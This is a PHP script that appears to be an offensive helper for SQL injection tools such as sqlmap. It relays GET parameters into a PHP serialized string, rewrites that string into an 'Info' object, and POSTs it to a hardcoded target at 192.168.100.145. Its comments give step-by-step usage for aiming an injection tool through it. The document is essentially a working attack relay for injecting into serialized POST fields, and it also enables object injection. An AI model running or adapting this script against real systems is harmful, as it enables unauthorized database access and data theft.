<?php
//A localhost webpagge to act as a filter for sqlinjection tools such as sqlmap
//The tool is highly customizable and allows sql injection using custom encoding
//This version allows for sql injection into a serialized string sent via POST as :
//param=SerializedString
//USAGE:
//Set $url for target, host this file locally
//sqli.exe http://127.0.0.1/sqlifilter.php?id=
//redirects to target!

//serialized string params to test
$id = intval($_GET['id']);
$firstname = $_GET['firstname'];
$surname = $_GET['surname'];
$artwork = $_GET['artwork'];
//build array
$tmp = array(

    'id' => $id,
    'firstname' => $firstname,
    'surname' => $surname,
    'artwork' => $artwork,
    );

//serialize data
$data = serialize($tmp);
//modify serialized string if needed!
$data = str_replace("a:4:", "O:4:\"Info\":4:", $data);

//check the new array if needed
//$data = unserialize($data);
//var_dump($data);

//POST DATA BUILDER
$post = array('param' => $data);
//attack url
$url = 'http://192.168.100.145/index.php';

//build request
$options = array(
    'http' => array(
        'header' => "Content-type: application/x-www-form-urlencoded\r\n",
        'method' => "POST",
        'content' => http_build_query($post),
    ),
);
//send
$context = stream_context_create($options);
//receive
$result = file_get_contents($url, false, $context);
//dump
var_dump($result);
?>
